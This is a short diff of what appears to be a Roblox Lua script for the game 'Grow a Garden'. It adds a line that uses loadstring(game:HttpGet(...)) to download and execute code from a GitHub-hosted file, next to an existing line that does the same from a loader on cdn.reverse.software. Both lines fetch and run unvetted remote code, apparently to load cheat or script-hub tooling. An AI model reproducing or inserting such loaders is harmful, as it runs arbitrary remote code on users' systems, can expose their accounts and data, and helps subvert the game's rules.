@@ -1,2 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JheremyX/GrowAGarden/refs/heads/main/loading%20screen"))()
 ID="3bbdbced-94c9-4ba0-80a9-219ba4e65085";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
